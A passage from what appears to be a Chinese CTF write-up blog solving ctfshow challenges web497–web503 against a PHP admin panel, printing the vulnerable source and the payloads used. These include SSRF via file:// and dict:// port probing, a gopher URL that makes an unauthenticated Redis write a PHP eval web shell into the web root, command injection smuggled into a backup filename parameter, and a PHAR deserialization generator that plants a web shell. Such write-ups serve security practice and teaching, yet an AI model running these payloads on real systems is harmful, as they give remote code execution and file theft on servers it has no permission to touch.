    $sql = &quot;update user set nickname=&#39;&quot;.substr($nickname, 0,8).&quot;&#39;,avatar=&#39;&quot;.$avatar.&quot;&#39; where username=&#39;&quot;.substr($user[&#39;username&#39;],0,8).&quot;&#39;&quot;;
    $db=new db();
    if($db-&gt;update_one($sql))&#123;
        $_SESSION[&#39;user&#39;][&#39;nickname&#39;]=$nickname;
        $_SESSION[&#39;user&#39;][&#39;avatar&#39;]=$avatar;
        $ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;
    &#125;else&#123;
        $ret[&#39;msg&#39;]=&#39;管理员信息修改失败&#39;;
    &#125;
    die(json_encode($ret));

&#125;else&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;



</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413201803657.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413201803657"></p>

<p>找到一个修改头像,试试ssrf</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413201900968.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413201900968"></p>

<p>使用file协议读取文件</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413203537687.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413203537687"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413203611392.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413203611392"></p>

<h1 id="web498"><a href="#web498" class="headerlink" title="web498"></a>web498</h1><p>这次发现flag文件读不成了,但是ssrf还在</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413204553495.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413204553495"></p>

<p>我们使用</p>
<pre><code class="php">dict://127.0.0.1:80
</code></pre>
<p>来探测一下本地端口</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413205251454.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413205251454"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413205320503.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413205320503"></p>

<p>发现6379端口开着,试试ssrf打无密码redis</p>
<pre><code class="php">gopherus --exploit redis
php

&lt;?php eval($_POST[&#39;zf&#39;]);?&gt;
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413205531082.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413205531082"></p>

<pre><code class="php">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%27zf%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413210540856.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413210540856"></p>

<h1 id="web499"><a href="#web499" class="headerlink" title="web499"></a>web499</h1><p>这次多了一个settings.php</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413210943926.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413210943926"></p>

<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-16 15:50:14
 Last Modified by:   h1xa
 Last Modified time: 2021-03-16 16:03:19
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


session_start();

error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
if($user)&#123;
    $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings.php&#39;));
    foreach ($_POST as $key =&gt; $value) &#123;
        $config[$key]=$value;
    &#125;
    file_put_contents(__DIR__.&#39;/../config/settings.php&#39;, serialize($config));
    $ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;
    die(json_encode($ret));

&#125;else&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413212004560.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413212004560"></p>

<p>简单写个一句话,写到了’_<em>DIR</em>_.’&#x2F;..&#x2F;config&#x2F;settings.php</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413212112902.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413212112902"></p>

<h1 id="web500"><a href="#web500" class="headerlink" title="web500"></a>web500</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413212450700.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413212450700"></p>

<p>这次多了一个数据库备份</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413212901748.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413212901748"></p>

<p>找到一个备份地址</p>
<p>api&#x2F;admin_db_backup.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-16 17:22:29
 Last Modified by:   h1xa
 Last Modified time: 2021-03-16 19:17:07
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
session_start();


error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
if($user)&#123;
    extract($_POST);
    shell_exec(&#39;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#39;.__DIR__.&#39;/../backup/&#39;.$db_path);


    if(file_exists(__DIR__.&#39;/../backup/&#39;.$db_path))&#123;
        $ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;
    &#125;else&#123;
        $ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;
    &#125;
    die(json_encode($ret));

&#125;else&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;

</code></pre>
<p>命令执行</p>
<pre><code class="php">;cp /f* /var/www/html/zf.txt
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413215811269.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413215811269"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413215857742.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413215857742"></p>

<h1 id="web501"><a href="#web501" class="headerlink" title="web501"></a>web501</h1><p>api&#x2F;admin_db_backup.php</p>
<pre><code class="php">
&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-16 17:22:29
 Last Modified by:   h1xa
 Last Modified time: 2021-03-17 14:39:25
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
session_start();


error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
if($user)&#123;
    extract($_POST);

    if(preg_match(&#39;/^zip|tar|sql$/&#39;, $db_format))&#123;
        shell_exec(&#39;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#39;.__DIR__.&#39;/../backup/&#39;.date_format(date_create(),&#39;Y-m-d&#39;).&#39;.&#39;.$db_format);
        if(file_exists(__DIR__.&#39;/../backup/&#39;.date_format(date_create(),&#39;Y-m-d&#39;).&#39;.&#39;.$db_format))&#123;
            $ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;
        &#125;else&#123;
            $ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;
        &#125;
    &#125;else&#123;
        $ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;
    &#125;
    
    die(json_encode($ret));

&#125;else&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;

</code></pre>
<pre><code class="php">db_format=tar; cp /f* /var/www/html/zf.txt
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413220821778.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413220821778"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413220833082.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413220833082"></p>

<h1 id="web502"><a href="#web502" class="headerlink" title="web502"></a>web502</h1><pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-16 17:22:29
 Last Modified by:   h1xa
 Last Modified time: 2021-03-18 22:15:42
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
session_start();

include(&#39;../render/db_class.php&#39;);
error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$pre=__DIR__.&#39;/../backup/&#39;.date_format(date_create(),&#39;Y-m-d&#39;).&#39;/db.&#39;;
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
if($user)&#123;
    extract($_POST);
    if(file_exists($pre.$db_format))&#123;
            $ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;
            die(json_encode($ret));
    &#125;

    if(preg_match(&#39;/^(zip|tar|sql)$/&#39;, $db_format))&#123;
        shell_exec(&#39;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#39;.$pre.$db_format);
        if(file_exists($pre.$db_format))&#123;
            $ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;
        &#125;else&#123;
            $ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;
        &#125;
    &#125;else&#123;
        $ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;
    &#125;
    die(json_encode($ret));

&#125;else&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;


</code></pre>
<p>这不是顾头不顾腚吗</p>
<pre><code class="php">l; cp /f* /var/www/html/zf.txt;
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413221724286.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413221724286"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413221731992.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413221731992"></p>

<h1 id="web503"><a href="#web503" class="headerlink" title="web503"></a>web503</h1><pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-16 17:22:29
 Last Modified by:   h1xa
 Last Modified time: 2021-03-18 22:15:42
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
session_start();

include(&#39;../render/db_class.php&#39;);
error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$pre=__DIR__.&#39;/../backup/&#39;.date_format(date_create(),&#39;Y-m-d&#39;).&#39;/db.&#39;;
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
if($user)&#123;
    extract($_POST);
    if(file_exists($pre.$db_format))&#123;
            $ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;
            die(json_encode($ret));
    &#125;

    if(preg_match(&#39;/^(zip|tar|sql)$/&#39;, $db_format))&#123;
        shell_exec(&#39;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#39;.md5($pre.$db_format));
        if(file_exists($pre.$db_format))&#123;
            $ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;
        &#125;else&#123;
            $ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;
        &#125;
    &#125;else&#123;
        $ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;
    &#125;
    die(json_encode($ret));

&#125;else&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;

</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413222608356.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413222608356"></p>

<p>又找到一个好东西</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-18 21:53:13
 Last Modified by:   h1xa
 Last Modified time: 2021-03-18 22:11:18
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

session_start();

error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
if($user)&#123;
    $arr = $_FILES[&quot;file&quot;];
    if(($arr[&quot;type&quot;]==&quot;image/jpeg&quot; || $arr[&quot;type&quot;]==&quot;image/png&quot; ) &amp;&amp; $arr[&quot;size&quot;]&lt;10241000 )
    &#123;
        $arr[&quot;tmp_name&quot;];
        $filename = md5($arr[&#39;name&#39;]);
        $ext = pathinfo($arr[&#39;name&#39;],PATHINFO_EXTENSION);
        if(!preg_match(&#39;/^php$/i&#39;, $ext))&#123;
            $basename = &quot;../img/&quot;.$filename.&#39;.&#39; . $ext;
            move_uploaded_file($arr[&quot;tmp_name&quot;],$basename);
            $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
            $config[&#39;logo&#39;]=$filename.&#39;.&#39; . $ext;
            file_put_contents(__DIR__.&#39;/../config/settings&#39;, serialize($config));
            $ret[&#39;msg&#39;]=&#39;文件上传成功&#39;;
        &#125;
        
    &#125;else&#123;
        $ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;
    &#125;
    
    die(json_encode($ret));

&#125;else&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;

</code></pre>
<p>这不是来了吗,有一个file_exists($pre.$db_format),还有文件上传.并且这里面的参数还可控</p>
<pre><code class="php">&lt;?php

class dbLog&#123;
    public $sql;
    public $content =&#39;&lt;?php @eval($_POST[zf]);?&gt;&#39;;
    public $log =&quot;./zf.php&quot;;

    public function __destruct()&#123;
        file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);
    &#125;
&#125;

$final = new dbLog();


@unlink(&#39;zf.phar&#39;);

$phar=new Phar(&#39;zf.phar&#39;);
$phar-&gt;startBuffering();
$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;);
$phar-&gt;setMetadata($final);
$phar-&gt;addFromString(&quot;zf.txt&quot;,&quot;test&quot;);
$phar-&gt;stopBuffering();
?&gt;
</code></pre>
